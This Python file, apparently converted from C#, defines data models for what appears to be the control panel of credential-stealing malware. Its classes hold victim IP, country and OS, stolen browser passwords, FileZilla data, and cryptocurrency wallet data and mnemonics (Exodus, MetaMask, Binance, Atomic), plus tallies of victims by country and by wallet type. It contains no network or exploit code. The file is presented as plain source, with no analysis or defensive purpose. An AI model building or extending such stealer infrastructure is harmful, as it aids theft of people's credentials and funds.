"""
Data Models
Converted from C# data classes
"""

from dataclasses import dataclass
from datetime import datetime
from typing import Optional

@dataclass
class ClientData:
    """Client connection data model"""
    ip: str = ""
    country: str = ""
    os: str = ""
    file_type: str = ""
    file_size: str = ""
    exodus: str = "0"
    blockchain: str = "0"
    binance: str = "0"
    metamask: str = "0"
    filezilla: str = "0"
    edge_passwords: str = "0"
    chrome_passwords: str = "0"
    files: str = "0"

@dataclass
class MnemonicData:
    """Mnemonic wallet data model"""
    mnemonic: str = ""
    password: str = ""
    received_time: Optional[datetime] = None
    
    def __post_init__(self):
        if self.received_time is None:
            self.received_time = datetime.now()

@dataclass
class AtomicMnemonicData:
    """Atomic wallet mnemonic data model"""
    atomic_mnemonic: str = ""
    atomic_password: str = ""
    received_time: Optional[datetime] = None
    
    def __post_init__(self):
        if self.received_time is None:
            self.received_time = datetime.now()

@dataclass
class CredentialData:
    """Password/credential data model"""
    website: str = ""
    username: str = ""
    password: str = ""
    dispose: str = ""

@dataclass
class WalletData:
    """Wallet data model"""
    ip: str = ""
    wallet: str = ""
    dispose: str = ""

@dataclass
class PasswordEntry:
    """Password entry model"""
    website: str = ""
    username: str = ""
    password: str = ""
    browser: str = ""
    client_ip: str = ""

# Configuration data
@dataclass
class ServerConfig:
    """Server configuration"""
    port: int = 8080
    is_running: bool = False
    current_port: int = -1

@dataclass
class CountryStats:
    """Country statistics"""
    us_count: int = 0
    italy_count: int = 0
    canada_count: int = 0
    germany_count: int = 0
    romania_count: int = 0
    sweden_count: int = 0
    china_count: int = 0
    other_count: int = 0

@dataclass
class WalletStats:
    """Wallet statistics"""
    exodus_count: int = 0
    blockchain_count: int = 0
    binance_count: int = 0
    metamask_count: int = 0
    filezilla_count: int = 0
    edge_passwords_count: int = 0
    chrome_passwords_count: int = 0
    files_count: int = 0